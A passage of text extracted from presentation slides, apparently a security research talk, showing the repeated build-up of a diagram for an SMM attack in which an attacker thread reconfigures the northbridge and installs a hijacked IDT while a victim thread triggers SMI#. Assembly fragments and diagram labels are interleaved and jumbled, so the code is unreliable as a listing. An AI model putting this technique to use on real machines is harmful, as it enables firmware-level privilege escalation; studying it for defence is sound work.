mov rax, SmiRendezvous
movq (0xf8013ff9), %rax RAM call smm_mce_handler
call rax
pop %%rsi
add   rsp, 0x20
pop %%rdi
fxrstor64 [rsp]
pop %%rax
... iretq
rsm
OS IDT
SMI#
Hijack IDT
SMI#

## Slide 187

mov si,0x8148
o32 lgdt [cs:si] …
mov eax,0x3 ffffffffc0b2ed80
mov cr0,eax
jmp short 0x14 ffffffffc0b2edc0
thread 0 (victim) ... ffffffffc0b2ee40
mov eax, 0x668
mov cl, 0
movq $0x92, %%rcx …
I/O  RAM
cmp cl, 0
loop .
je 3f
Device push %%rax
outb %%al, $0xb2 bts eax, 12
push %%rdi
nop mov cr4, rax
push %%rsi
sub esp, 8 call os_mce_handler
sgdt [rsp]
pop %%rsi
mov eax, [rsp + 2]
pop %%rdi
add esp, 8
pop %%rax
mov dl, 0x89
iretq
...
North
CPU mov rbx, cr0
Bridge or ebx, 0x80010023 …
mov cr0, rbx
retf
mov rax, 0
MMIO ffffffffc0197da0
lidt [rax]
lea ebx, [rdi+DSC_OFFS]
thread 1 (attacker)  mov ax, [rbx+DSC_DS]
mov ds, eax …
PCIe
(reconfigure northbridge) mov ax, [rbx+DSC_OT]
mov es, eax
device (install hijack IDT) ... push %%raxpush %%rdi
mov rcx, rbx
push %%rsi
mov rax, SmiRendezvous
movq (0xf8013ff9), %rax RAM call smm_mce_handler
call rax
pop %%rsi
add   rsp, 0x20
pop %%rdi
fxrstor64 [rsp]
pop %%rax
... iretq
rsm
OS IDT
SMI#
Hijack IDT
SMI#

## Slide 188

mov si,0x8148
o32 lgdt [cs:si] …
mov eax,0x3 ffffffffc0b2ed80
mov cr0,eax
jmp short 0x14 ffffffffc0b2edc0
thread 0 (victim) ... ffffffffc0b2ee40
mov eax, 0x668
mov cl, 0
movq $0x92, %%rcx …
I/O  RAM
cmp cl, 0
loop .
je 3f
Device push %%rax
outb %%al, $0xb2 bts eax, 12
push %%rdi
nop mov cr4, rax
push %%rsi
sub esp, 8 call os_mce_handler
sgdt [rsp]
pop %%rsi
mov eax, [rsp + 2]
pop %%rdi
add esp, 8
pop %%rax
mov dl, 0x89
iretq
...
North
CPU mov rbx, cr0
Bridge or ebx, 0x80010023 …
mov cr0, rbx
retf
mov rax, 0
MMIO ffffffffc0197da0
lidt [rax]
lea ebx, [rdi+DSC_OFFS]
thread 1 (attacker)  mov ax, [rbx+DSC_DS]
mov ds, eax …
PCIe
(reconfigure northbridge) mov ax, [rbx+DSC_OT]
mov es, eax
device (install hijack IDT) ... push %%raxpush %%rdi
mov rcx, rbx
push %%rsi
mov rax, SmiRendezvous
movq (0xf8013ff9), %rax RAM call smm_mce_handler
call rax
pop %%rsi
add   rsp, 0x20
pop %%rdi
fxrstor64 [rsp]
pop %%rax
... iretq
rsm
OS IDT
SMI#
Hijack IDT
SMI#

## Slide 189

mov si,0x8148
o32 lgdt [cs:si] …
mov eax,0x3 ffffffffc0b2ed80
mov cr0,eax
jmp short 0x14 ffffffffc0b2edc0
thread 0 (victim) ... ffffffffc0b2ee40
mov eax, 0x668
mov cl, 0
movq $0x92, %%rcx …
I/O  RAM
cmp cl, 0
loop .
je 3f
Device push %%rax
outb %%al, $0xb2 bts eax, 12
push %%rdi
nop mov cr4, rax
push %%rsi
sub esp, 8 call os_mce_handler
sgdt [rsp]
pop %%rsi
mov eax, [rsp + 2]
pop %%rdi
add esp, 8
pop %%rax
mov dl, 0x89
iretq
...
North
CPU mov rbx, cr0
Bridge or ebx, 0x80010023 …
mov cr0, rbx
retf
mov rax, 0
MMIO ffffffffc0197da0
lidt [rax]
lea ebx, [rdi+DSC_OFFS]
thread 1 (attacker)  mov ax, [rbx+DSC_DS]
mov ds, eax …
PCIe
(reconfigure northbridge) mov ax, [rbx+DSC_OT]
mov es, eax
device (install hijack IDT) ... push %%raxpush %%rdi
mov rcx, rbx
push %%rsi
mov rax, SmiRendezvous
movq (0xf8013ff9), %rax RAM call smm_mce_handler
call rax
pop %%rsi
add   rsp, 0x20
pop %%rdi
fxrstor64 [rsp]
pop %%rax
... iretq
rsm
OS IDT
SMI#
Hijack IDT
SMI#

## Slide 190

mov si,0x8148
o32 lgdt [cs:si] …
mov eax,0x3 ffffffffc0b2ed80
mov cr0,eax
jmp short 0x14 ffffffffc0b2edc0
thread 0 (victim) ... ffffffffc0b2ee40
mov eax, 0x668
mov cl, 0
movq $0x92, %%rcx …
I/O  RAM
cmp cl, 0
loop .
je 3f
Device push %%rax
outb %%al, $0xb2 bts eax, 12
push %%rdi
nop mov cr4, rax
push %%rsi
sub esp, 8 call os_mce_handler
sgdt [rsp]
pop %%rsi
mov eax, [rsp + 2]
pop %%rdi
add esp, 8
pop %%rax
mov dl, 0x89
iretq
...
North
CPU mov rbx, cr0
Bridge or ebx, 0x80010023 …
mov cr0, rbx
retf
mov rax, 0
MMIO ffffffffc0197da0
lidt [rax]
lea ebx, [rdi+DSC_OFFS]
thread 1 (attacker)  mov ax, [rbx+DSC_DS]
mov ds, eax …
PCIe
(reconfigure northbridge) mov ax, [rbx+DSC_OT]
mov es, eax
device (install hijack IDT) ... push %%raxpush %%rdi
mov rcx, rbx
push %%rsi
mov rax, SmiRendezvous
movq (0xf8013ff9), %rax RAM call smm_mce_handler
call rax
pop %%rsi
add   rsp, 0x20
pop %%rdi
fxrstor64 [rsp]
pop %%rax
... iretq
rsm
OS IDT
SMI#
Hijack IDT
SMI#

## Slide 191

mov si,0x8148
o32 lgdt [cs:si] …
mov eax,0x3 ffffffffc0b2ed80
mov cr0,eax
jmp short 0x14 ffffffffc0b2edc0
thread 0 (victim) ... ffffffffc0b2ee40
mov eax, 0x668
mov cl, 0
movq $0x92, %%rcx …
I/O  RAM
cmp cl, 0
loop .
je 3f
Device push %%rax
outb %%al, $0xb2 bts eax, 12
push %%rdi
nop mov cr4, rax
push %%rsi
sub esp, 8 call os_mce_handler
sgdt [rsp]
pop %%rsi
mov eax, [rsp + 2]
pop %%rdi
add esp, 8
pop %%rax
mov dl, 0x89
iretq
...
North
CPU mov rbx, cr0
Bridge or ebx, 0x80010023 …
mov cr0, rbx
retf
mov rax, 0
MMIO ffffffffc0197da0
lidt [rax]
lea ebx, [rdi+DSC_OFFS]
thread 1 (attacker)  mov ax, [rbx+DSC_DS]
mov ds, eax …
PCIe
(reconfigure northbridge) mov ax, [rbx+DSC_OT]
mov es, eax
device (install hijack IDT) ... push %%raxpush %%rdi
mov rcx, rbx
push %%rsi
mov rax, SmiRendezvous
movq (0xf8013ff9), %rax RAM call smm_mce_handler
call rax
pop %%rsi
add   rsp, 0x20
pop %%rdi
fxrstor64 [rsp]
pop %%rax
... iretq
rsm
OS IDT
SMI#
Hijack IDT
SMI#

## Slide 192

mov si,0x8148
o32 lgdt [cs:si] …
mov eax,0x3 ffffffffc0b2ed80
mov cr0,eax
jmp short 0x14 ffffffffc0b2edc0
thread 0 (victim) ... ffffffffc0b2ee40
mov eax, 0x668
mov cl, 0
movq $0x92, %%rcx …
I/O  RAM
cmp cl, 0
loop .
je 3f
Device push %%rax
outb %%al, $0xb2 bts eax, 12
push %%rdi
nop mov cr4, rax
push %%rsi
sub esp, 8 call os_mce_handler
sgdt [rsp]
pop %%rsi
mov eax, [rsp + 2]
pop %%rdi
add esp, 8
pop %%rax
mov dl, 0x89
iretq
...
North
CPU mov rbx, cr0
Bridge or ebx, 0x80010023 …
mov cr0, rbx
retf
mov rax, 0
MMIO ffffffffc0197da0
lidt [rax]
lea ebx, [rdi+DSC_OFFS]
thread 1 (attacker)  mov ax, [rbx+DSC_DS]
mov ds, eax …
PCIe
(reconfigure northbridge) mov ax, [rbx+DSC_OT]
mov es, eax
device (install hijack IDT) ... push %%raxpush %%rdi
mov rcx, rbx
push %%rsi
mov rax, SmiRendezvous
movq (0xf8013ff9), %rax RAM call smm_mce_handler
call rax
pop %%rsi
add   rsp, 0x20
pop %%rdi
fxrstor64 [rsp]
pop %%rax
... iretq
rsm
OS IDT
SMI#
Hijack IDT
SMI#

## Slide 193

mov si,0x8148
o32 lgdt [cs:si] …
mov eax,0x3 ffffffffc0b2ed80
mov cr0,eax
jmp short 0x14 ffffffffc0b2edc0
thread 0 (victim) ... ffffffffc0b2ee40
mov eax, 0x668
mov cl, 0
movq $0x92, %%rcx …
I/O  RAM
cmp cl, 0
loop .
je 3f
Device push %%rax
outb %%al, $0xb2 bts eax, 12
push %%rdi
nop mov cr4, rax
push %%rsi
sub esp, 8 call os_mce_handler
sgdt [rsp]
pop %%rsi
mov eax, [rsp + 2]
pop %%rdi
add esp, 8
pop %%rax
mov dl, 0x89
iretq
...
North
CPU mov rbx, cr0
Bridge or ebx, 0x80010023 …
mov cr0, rbx
retf
mov rax, 0
MMIO ffffffffc0197da0
lidt [rax]
lea ebx, [rdi+DSC_OFFS]
thread 1 (attacker)  mov ax, [rbx+DSC_DS]
mov ds, eax …
PCIe
(reconfigure northbridge) mov ax, [rbx+DSC_OT]
mov es, eax
device (install hijack IDT) ... push %%raxpush %%rdi
mov rcx, rbx
push %%rsi
mov rax, SmiRendezvous
movq (0xf8013ff9), %rax RAM call smm_mce_handler
call rax
pop %%rsi
add   rsp, 0x20
pop %%rdi
fxrstor64 [rsp]
pop %%rax
... iretq
rsm
OS IDT
SMI#
Hijack IDT
SMI#

## Slide 194

mov si,0x8148
o32 lgdt [cs:si] …
mov eax,0x3 ffffffffc0b2ed80
mov cr0,eax
jmp short 0x14 ffffffffc0b2edc0
thread 0 (victim) ... ffffffffc0b2ee40
mov eax, 0x668
mov cl, 0
movq $0x92, %%rcx …
I/O  RAM
cmp cl, 0
loop .
je 3f
Device push %%rax
outb %%al, $0xb2 bts eax, 12
push %%rdi
nop mov cr4, rax
push %%rsi
sub esp, 8 call os_mce_handler
sgdt [rsp]
pop %%rsi
mov eax, [rsp + 2]
pop %%rdi
add esp, 8
pop %%rax
mov dl, 0x89
iretq
...
North
CPU mov rbx, cr0
Bridge or ebx, 0x80010023 …
mov cr0, rbx
retf
mov rax, 0
MMIO ffffffffc0197da0
lidt [rax]
lea ebx, [rdi+DSC_OFFS]
thread 1 (attacker)  mov ax, [rbx+DSC_DS]
mov ds, eax …
PCIe
(reconfigure northbridge) mov ax, [rbx+DSC_OT]
mov es, eax
device (install hijack IDT) ... push %%raxpush %%rdi
mov rcx, rbx
push %%rsi
mov rax, SmiRendezvous
movq (0xf8013ff9), %rax RAM call smm_mce_handler
call rax
pop %%rsi
add   rsp, 0x20
pop %%rdi
fxrstor64 [rsp]
pop %%rax
... iretq
rsm
OS IDT
SMI#
Hijack IDT
SMI#

## Slide 195

mov si,0x8148
o32 lgdt [cs:si] …
mov eax,0x3 ffffffffc0b2ed80
mov cr0,eax
jmp short 0x14 ffffffffc0b2edc0
thread 0 (victim) ... ffffffffc0b2ee40
mov eax, 0x668
mov cl, 0
movq $0x92, %%rcx …
I/O  RAM
cmp cl, 0
loop .
je 3f
Device push %%rax
outb %%al, $0xb2 bts eax, 12
push %%rdi
nop mov cr4, rax
push %%rsi
sub esp, 8 call os_mce_handler
sgdt [rsp]
pop %%rsi
mov eax, [rsp + 2]
pop %%rdi
add esp, 8
pop %%rax
mov dl, 0x89
iretq
...
North
CPU mov rbx, cr0
Bridge or ebx, 0x80010023 …
mov cr0, rbx
retf
mov rax, 0
MMIO ffffffffc0197da0
lidt [rax]
lea ebx, [rdi+DSC_OFFS]
thread 1 (attacker)  mov ax, [rbx+DSC_DS]
mov ds, eax …
PCIe
(reconfigure northbridge) mov ax, [rbx+DSC_OT]
mov es, eax
device (install hijack IDT) ... push %%raxpush %%rdi
mov rcx, rbx
push %%rsi
mov rax, SmiRendezvous
movq (0xf8013ff9), %rax RAM call smm_mce_handler
call rax
pop %%rsi
add   rsp, 0x20
pop %%rdi
fxrstor64 [rsp]
pop %%rax
... iretq
rsm
OS IDT
SMI#
Hijack IDT
SMI#

## Slide 196

mov si,0x8148
o32 lgdt [cs:si] …
mov eax,0x3 ffffffffc0b2ed80
mov cr0,eax
jmp short 0x14 ffffffffc0b2edc0
thread 0 (victim) ... ffffffffc0b2ee40
mov eax, 0x668
mov cl, 0
movq $0x92, %%rcx …
I/O  RAM
cmp cl, 0
loop .
je 3f
Device push %%rax
outb %%al, $0xb2 bts eax, 12
push %%rdi
nop mov cr4, rax
push %%rsi
sub esp, 8 call os_mce_handler
sgdt [rsp]
pop %%rsi
mov eax, [rsp + 2]
pop %%rdi
add esp, 8
pop %%rax
mov dl, 0x89
iretq
...
North
CPU mov rbx, cr0
Bridge or ebx, 0x80010023 …
mov cr0, rbx
retf
mov rax, 0
MMIO ffffffffc0197da0
lidt [rax]
lea ebx, [rdi+DSC_OFFS]
thread 1 (attacker)  mov ax, [rbx+DSC_DS]
mov ds, eax …
PCIe
(reconfigure northbridge) mov ax, [rbx+DSC_OT]
mov es, eax
device (install hijack IDT) ... push %%raxpush %%rdi
mov rcx, rbx
push %%rsi
mov rax, SmiRendezvous
movq (0xf8013ff9), %rax RAM call smm_mce_handler
call rax
pop %%rsi
add   rsp, 0x20
pop %%rdi
fxrstor64 [rsp]
pop %%rax
... iretq
rsm
OS IDT
SMI#
Hijack IDT
SMI#

## Slide 197

mov si,0x8148
o32 lgdt [cs:si] …
mov eax,0x3 ffffffffc0b2ed80
mov cr0,eax
jmp short 0x14 ffffffffc0b2edc0
thread 0 (victim) ... ffffffffc0b2ee40
mov eax, 0x668
mov cl, 0
movq $0x92, %%rcx …
I/O  RAM
cmp cl, 0
loop .
je 3f
Device push %%rax
outb %%al, $0xb2 bts eax, 12
push %%rdi
nop mov cr4, rax
push %%rsi
sub esp, 8 call os_mce_handler
sgdt [rsp]
pop %%rsi
mov eax, [rsp + 2]
pop %%rdi
add esp, 8
pop %%rax
mov dl, 0x89
iretq
...
North
CPU mov rbx, cr0
Bridge or ebx, 0x80010023 …
mov cr0, rbx
retf
mov rax, 0
MMIO ffffffffc0197da0
lidt [rax]
lea ebx, [rdi+DSC_OFFS]
thread 1 (attacker)  mov ax, [rbx+DSC_DS]
mov ds, eax …
PCIe
(reconfigure northbridge) mov ax, [rbx+DSC_OT]
mov es, eax
device (install hijack IDT) ... push %%raxpush %%rdi
mov rcx, rbx
push %%rsi
mov rax, SmiRendezvous
movq (0xf8013ff9), %rax RAM call smm_mce_handler
call rax
pop %%rsi
add   rsp, 0x20
pop %%rdi
fxrstor64 [rsp]
pop %%rax
... iretq
rsm
OS IDT
SMI#
Hijack IDT
SMI#

## Slide 198

mov si,0x8148
o32 lgdt [cs:si] …
mov eax,0x3 ffffffffc0b2ed80
mov cr0,eax
jmp short 0x14 ffffffffc0b2edc0
thread 0 (victim) ... ffffffffc0b2ee40
mov eax, 0x668
mov cl, 0
movq $0x92, %%rcx …
I/O  RAM
cmp cl, 0
loop .
je 3f
Device push %%rax
outb %%al, $0xb2 bts eax, 12
push %%rdi
nop mov cr4, rax
push %%rsi
sub esp, 8 call os_mce_handler
sgdt [rsp]
pop %%rsi
mov eax, [rsp + 2]
pop %%rdi
add esp, 8
pop %%rax
mov dl, 0x89
iretq
...
North
CPU mov rbx, cr0
Bridge or ebx, 0x80010023 …
mov cr0, rbx
retf
mov rax, 0
MMIO ffffffffc0197da0
lidt [rax]
lea ebx, [rdi+DSC_OFFS]
thread 1 (attacker)  mov ax, [rbx+DSC_DS]
mov ds, eax …
PCIe
(reconfigure northbridge) mov ax, [rbx+DSC_OT]
mov es, eax
device (install hijack IDT) ... push %%raxpush %%rdi
mov rcx, rbx
push %%rsi
mov rax, SmiRendezvous
movq (0xf8013ff9), %rax RAM call smm_mce_handler
call rax
pop %%rsi
add   rsp, 0x20
pop %%rdi
fxrstor64 [rsp]
pop %%rax
... iretq
rsm
OS IDT
SMI#
Hijack IDT
SMI#

## Slide 199

mov si,0x8148
o32 lgdt [cs:si] …
mov eax,0x3 ffffffffc0b2ed80
mov cr0,eax
jmp short 0x14 ffffffffc0b2edc0
thread 0 (victim) ... ffffffffc0b2ee40
mov eax, 0x668
mov cl, 0
movq $0x92, %%rcx …
I/O  RAM
cmp cl, 0
loop .
je 3f
Device push %%rax
outb %%al, $0xb2 bts eax, 12
push %%rdi
nop mov cr4, rax
push %%rsi
sub esp, 8 call os_mce_handler
sgdt [rsp]
pop %%rsi
mov eax, [rsp + 2]
pop %%rdi
add esp, 8
pop %%rax
mov dl, 0x89
iretq
...
North
CPU mov rbx, cr0
Bridge or ebx, 0x80010023 …
mov cr0, rbx
retf
mov rax, 0
MMIO ffffffffc0197da0
lidt [rax]
lea ebx, [rdi+DSC_OFFS]
thread 1 (attacker)  mov ax, [rbx+DSC_DS]
mov ds, eax …
PCIe
(reconfigure northbridge) mov ax, [rbx+DSC_OT]
mov es, eax
device (install hijack IDT) ... push %%raxpush %%rdi
mov rcx, rbx
push %%rsi
mov rax, SmiRendezvous
movq (0xf8013ff9), %rax RAM call smm_mce_handler
call rax
pop %%rsi
add   rsp, 0x20
pop %%rdi
fxrstor64 [rsp]
pop %%rax
... iretq
rsm
OS IDT
SMI#
Hijack IDT
SMI#

## Slide 200

mov si,0x8148
o32 lgdt [cs:si] …
mov eax,0x3 ffffffffc0b2ed80
mov cr0,eax
jmp short 0x14 ffffffffc0b2edc0
thread 0 (victim) ... ffffffffc0b2ee40
mov eax, 0x668
mov cl, 0
movq $0x92, %%rcx …
I/O  RAM
cmp cl, 0
loop .
je 3f
Device push %%rax
outb %%al, $0xb2 bts eax, 12
push %%rdi
nop mov cr4, rax
push %%rsi
sub esp, 8 call os_mce_handler
sgdt [rsp]
pop %%rsi
mov eax, [rsp + 2]
pop %%rdi
add esp, 8
pop %%rax
mov dl, 0x89
iretq
...
North
CPU mov rbx, cr0
Bridge or ebx, 0x80010023 …
mov cr0, rbx
retf
mov rax, 0
UR MMIO ffffffffc0197da0
lidt [rax]
lea ebx, [rdi+DSC_OFFS]
thread 1 (attacker)  mov ax, [rbx+DSC_DS]
mov ds, eax …
PCIe
(reconfigure northbridge) mov ax, [rbx+DSC_OT]
mov es, eax
device (install hijack IDT) ... push %%raxpush %%rdi
mov rcx, rbx
push %%rsi
mov rax, SmiRendezvous
movq (0xf8013ff9), %rax RAM call smm_mce_handler
call rax
pop %%rsi
add   rsp, 0x20
pop %%rdi
fxrstor64 [rsp]
pop %%rax
... iretq
rsm
OS IDT
SMI#
Hijack IDT
SMI#

## Slide 201

mov si,0x8148
o32 lgdt [cs:si] …
mov eax,0x3 ffffffffc0b2ed80
mov cr0,eax
jmp short 0x14 ffffffffc0b2edc0
thread 0 (victim) ... ffffffffc0b2ee40
mov eax, 0x668
mov cl, 0
movq $0x92, %%rcx …
I/O  RAM
cmp cl, 0
loop .
je 3f
Device push %%rax
outb %%al, $0xb2 bts eax, 12
push %%rdi
nop mov cr4, rax
push %%rsi
sub esp, 8 call os_mce_handler
sgdt [rsp]
pop %%rsi
mov eax, [rsp + 2]
pop %%rdi
add esp, 8
pop %%rax
mov dl, 0x89
iretq
...
North
CPU mov rbx, cr0
Bridge or ebx, 0x80010023 …
mov cr0, rbx
retf
mov rax, 0
UR MMIO ffffffffc0197da0
lidt [rax]
lea ebx, [rdi+DSC_OFFS]
thread 1 (attacker)  mov ax, [rbx+DSC_DS]
mov ds, eax …
PCIe
(reconfigure northbridge) mov ax, [rbx+DSC_OT]
mov es, eax
device (install hijack IDT) ... push %%raxpush %%rdi
mov rcx, rbx
push %%rsi
mov rax, SmiRendezvous
movq (0xf8013ff9), %rax RAM call smm_mce_handler
call rax
pop %%rsi
add   rsp, 0x20
pop %%rdi
fxrstor64 [rsp]
pop %%rax
... iretq
rsm
OS IDT
SMI#
CpuRdDatErr
Hijack IDT
SMI#

## Slide 202

mov si,0x8148
o32 lgdt [cs:si]
mov eax,0x3
mov cr0,eax
jmp short 0x14
thread 0 (victim) ...
mov eax, 0x668
movq $0x92, %%rcx mov cl, 0
I/O  RAM
cmp cl, 0
loop .
Device je 3f
outb %%al, $0xb2 bts eax, 12
nop mov cr4, rax
sub esp, 8
sgdt [rsp]
mov eax, [rsp + 2]
add esp, 8
mov dl, 0x89
...
North  MC#
CPU mov rbx, cr0
Bridge or ebx, 0x80010023
mov cr0, rbx
retf
mov rax, 0
UR MMIO
lidt [rax]
lea ebx, [rdi+DSC_OFFS]
thread 1 (attacker)  mov ax, [rbx+DSC_DS]
mov ds, eax
PCIe
(reconfigure northbridge) mov ax, [rbx+DSC_OT]
mov es, eax
device
(install hijack IDT) ...
mov rcx, rbx
movq (0xf8013ff9), %rax mov rax, SmiRendezvous RAM
call rax
add   rsp, 0x20
fxrstor64 [rsp]
...
rsm
SMI#
CpuRdDatErr
SMI#

…
ffffffffc0b2ed80
ffffffffc0b2edc0
ffffffffc0b2ee40
…
push %%rax
push %%rdi
push %%rsi
call os_mce_handler
pop %%rsi
pop %%rdi
pop %%rax
iretq
…
ffffffffc0197da0
…
OS IDT
Hijack IDT

push %%rax push %%rdi push %%rsi call smm_mce_handler pop %%rsi pop %%rdi pop %%rax iretq

## Slide 203

mov si,0x8148
o32 lgdt [cs:si] …
mov eax,0x3 ffffffffc0b2ed80
mov cr0,eax
jmp short 0x14 ffffffffc0b2edc0
thread 0 (victim) ... ffffffffc0b2ee40
mov eax, 0x668
mov cl, 0
movq $0x92, %%rcx …
I/O  RAM
cmp cl, 0
loop .
je 3f
Device push %%rax
outb %%al, $0xb2 bts eax, 12
push %%rdi
nop mov cr4, rax
push %%rsi
sub esp, 8 call os_mce_handler
sgdt [rsp]
pop %%rsi
mov eax, [rsp + 2]
pop %%rdi
add esp, 8
pop %%rax
mov dl, 0x89
iretq
...
North  MC#
CPU mov rbx, cr0
Bridge or ebx, 0x80010023 …
mov cr0, rbx
retf
mov rax, 0
UR MMIO ffffffffc0197da0
lidt [rax]
lea ebx, [rdi+DSC_OFFS]
thread 1 (attacker)  mov ax, [rbx+DSC_DS]
mov ds, eax …
PCIe
(reconfigure northbridge) mov ax, [rbx+DSC_OT]
mov es, eax
device (install hijack IDT) ... push %%raxpush %%rdi
mov rcx, rbx
push %%rsi
mov rax, SmiRendezvous
movq (0xf8013ff9), %rax RAM call smm_mce_handler
call rax
pop %%rsi
add   rsp, 0x20
pop %%rdi
fxrstor64 [rsp]
pop %%rax
... iretq
rsm
OS IDT
SMI#
CpuRdDatErr
Hijack IDT
SMI#

## Slide 204

mov si,0x8148
o32 lgdt [cs:si] …
mov eax,0x3 ffffffffc0b2ed80
mov cr0,eax
jmp short 0x14 ffffffffc0b2edc0
thread 0 (victim) ... ffffffffc0b2ee40
mov eax, 0x668
mov cl, 0
movq $0x92, %%rcx …
I/O  RAM
cmp cl, 0
loop .
je 3f
Device push %%rax
outb %%al, $0xb2 bts eax, 12
push %%rdi
nop mov cr4, rax
push %%rsi
sub esp, 8 call os_mce_handler
sgdt [rsp]
pop %%rsi
mov eax, [rsp + 2]
pop %%rdi
add esp, 8
pop %%rax
mov dl, 0x89
iretq
...
North  MC#
CPU mov rbx, cr0
Bridge or ebx, 0x80010023 …
mov cr0, rbx
retf
mov rax, 0
UR MMIO ffffffffc0197da0
lidt [rax]
lea ebx, [rdi+DSC_OFFS]
thread 1 (attacker)  mov ax, [rbx+DSC_DS]
mov ds, eax …
PCIe
(reconfigure northbridge) mov ax, [rbx+DSC_OT]
mov es, eax
device (install hijack IDT) ... push %%raxpush %%rdi
mov rcx, rbx
push %%rsi
mov rax, SmiRendezvous
movq (0xf8013ff9), %rax RAM call smm_mce_handler
call rax
pop %%rsi
add   rsp, 0x20
pop %%rdi
fxrstor64 [rsp]
pop %%rax
... iretq
rsm
OS IDT
SMI#
CpuRdDatErr
Hijack IDT
SMI#

## Slide 205

mov si,0x8148
o32 lgdt [cs:si] …
mov eax,0x3 ffffffffc0b2ed80
mov cr0,eax
jmp short 0x14 ffffffffc0b2edc0
thread 0 (victim) ... ffffffffc0b2ee40
mov eax, 0x668
mov cl, 0
movq $0x92, %%rcx …
I/O  RAM
cmp cl, 0
loop .
je 3f
Device push %%rax
outb %%al, $0xb2 bts eax, 12
push %%rdi
nop mov cr4, rax
push %%rsi
sub esp, 8 call os_mce_handler
sgdt [rsp]
pop %%rsi
mov eax, [rsp + 2]
pop %%rdi
add esp, 8
pop %%rax
mov dl, 0x89
iretq
...
North  MC#
CPU mov rbx, cr0
Bridge or ebx, 0x80010023 …
mov cr0, rbx
retf
mov rax, 0
UR MMIO ffffffffc0197da0
lidt [rax]
lea ebx, [rdi+DSC_OFFS]
thread 1 (attacker)  mov ax, [rbx+DSC_DS]
mov ds, eax …
PCIe
(reconfigure northbridge) mov ax, [rbx+DSC_OT]
mov es, eax
device (install hijack IDT) ... push %%raxpush %%rdi
mov rcx, rbx
push %%rsi
movq (0xf8013ff9), %rax mov rax, SmiRendezvous RAM call smm_mce_handler
call rax
pop %%rsi
add   rsp, 0x20
pop %%rdi
fxrstor64 [rsp]
pop %%rax
... iretq
rsm
OS IDT
SMI#
CpuRdDatErr
Hijack IDT
SMI#

## Slide 206

mov si,0x8148
o32 lgdt [cs:si] …
mov eax,0x3 ffffffffc0b2ed80
mov cr0,eax
jmp short 0x14 ffffffffc0b2edc0
thread 0 (victim) ... ffffffffc0b2ee40
mov eax, 0x668
mov cl, 0
movq $0x92, %%rcx …
I/O  RAM
cmp cl, 0
loop .
je 3f
Device push %%rax
outb %%al, $0xb2 bts eax, 12
push %%rdi
nop mov cr4, rax
push %%rsi
sub esp, 8 call os_mce_handler
sgdt [rsp]
pop %%rsi
mov eax, [rsp + 2]
pop %%rdi
add esp, 8
pop %%rax
mov dl, 0x89
iretq
...
North
CPU mov rbx, cr0
Bridge or ebx, 0x80010023 …
mov cr0, rbx
retf
mov rax, 0
MMIO ffffffffc0197da0
lidt [rax]
lea ebx, [rdi+DSC_OFFS]
thread 1 (attacker)  mov ax, [rbx+DSC_DS]
mov ds, eax …
PCIe
(reconfigure northbridge) mov ax, [rbx+DSC_OT]
mov es, eax
device (install hijack IDT) ... push %%raxpush %%rdi
mov rcx, rbx
push %%rsi
movq (0xf8013ff9), %rax mov rax, SmiRendezvous RAM call smm_mce_handler
call rax
pop %%rsi
add   rsp, 0x20
pop %%rdi
fxrstor64 [rsp]
pop %%rax
... iretq
rsm
OS IDT
SMI#
Hijack IDT
SMI#

## Slide 207

mov si,0x8148
o32 lgdt [cs:si] …
mov eax,0x3 ffffffffc0b2ed80
mov cr0,eax
jmp short 0x14 ffffffffc0b2edc0
thread 0 (victim) ... ffffffffc0b2ee40
mov eax, 0x668
mov cl, 0
movq $0x92, %%rcx …
I/O  RAM
cmp cl, 0
loop .
je 3f
Device push %%rax
outb %%al, $0xb2 bts eax, 12
push %%rdi
nop mov cr4, rax
push %%rsi
sub esp, 8 call os_mce_handler
sgdt [rsp]
pop %%rsi
mov eax, [rsp + 2]
pop %%rdi
add esp, 8
pop %%rax
mov dl, 0x89
iretq
...
North
CPU mov rbx, cr0
Bridge or ebx, 0x80010023 …
mov cr0, rbx
retf
mov rax, 0
MMIO ffffffffc0197da0
lidt [rax]
lea ebx, [rdi+DSC_OFFS]
thread 1 (attacker)  mov ax, [rbx+DSC_DS]
mov ds, eax …
PCIe
(reconfigure northbridge) mov ax, [rbx+DSC_OT]
mov es, eax
device (install hijack IDT) ... push %%raxpush %%rdi
mov rcx, rbx
push %%rsi
movq (0xf8013ff9), %rax mov rax, SmiRendezvous RAM call smm_mce_handler
call rax
pop %%rsi
add   rsp, 0x20
pop %%rdi
fxrstor64 [rsp]
pop %%rax
... iretq
rsm
OS IDT
SMI#
Hijack IDT
SMI#

## Slide 208

mov si,0x8148
o32 lgdt [cs:si] …
mov eax,0x3 ffffffffc0b2ed80
mov cr0,eax
jmp short 0x14 ffffffffc0b2edc0
thread 0 (victim) ... ffffffffc0b2ee40
mov eax, 0x668
mov cl, 0
movq $0x92, %%rcx …
I/O  RAM
cmp cl, 0
loop .
je 3f
Device push %%rax
outb %%al, $0xb2 bts eax, 12
push %%rdi
nop mov cr4, rax
push %%rsi
sub esp, 8 call os_mce_handler
sgdt [rsp]
pop %%rsi
mov eax, [rsp + 2]
pop %%rdi
add esp, 8
pop %%rax
mov dl, 0x89
iretq
...
North
CPU mov rbx, cr0
Bridge or ebx, 0x80010023 …
mov cr0, rbx
retf
mov rax, 0
MMIO ffffffffc0197da0
lidt [rax]
lea ebx, [rdi+DSC_OFFS]
thread 1 (attacker)  mov ax, [rbx+DSC_DS]
mov ds, eax …
PCIe
(reconfigure northbridge) mov ax, [rbx+DSC_OT]
mov es, eax
device (install hijack IDT) ... push %%raxpush %%rdi
mov rcx, rbx
push %%rsi
movq (0xf8013ff9), %rax mov rax, SmiRendezvous RAM call smm_mce_handler
call rax
pop %%rsi
add   rsp, 0x20
pop %%rdi
fxrstor64 [rsp]
pop %%rax
... iretq
rsm
OS IDT
SMI#
Hijack IDT
SMI#

## Slide 209

thread 0 (victim)
movq $0x92, %%rcx
I/O  RAM
loop .
Device
outb %%al, $0xb2
nop
North
CPU
Bridge
MMIO
thread 1 (attacker)
PCIe
(reconfigure northbridge)
device
(install hijack IDT)
movq (0xf8013ff9), %rax RAM
SMI#

… ffffffffc0b2ed80 ffffffffc0b2edc0 ffffffffc0b2ee40 … RAM push %%rax push %%rdi push %%rsi call os_mce_handler pop %%rsi pop %%rdi pop %%rax iretq … MMIO ffffffffc0197da0 … push %%rax push %%rdi push %%rsi RAM call smm_mce_handler pop %%rsi pop %%rdi pop %%rax iretq

## Slide 210

thread 0 (victim)
movq $0x92, %%rcx
I/O  RAM
loop .
Device
outb %%al, $0xb2
nop
North
CPU
Bridge
MMIO
thread 1 (attacker)
PCIe
(reconfigure northbridge)
device
(install hijack IDT)
movq (0xf8013ff9), %rax RAM
SMI#

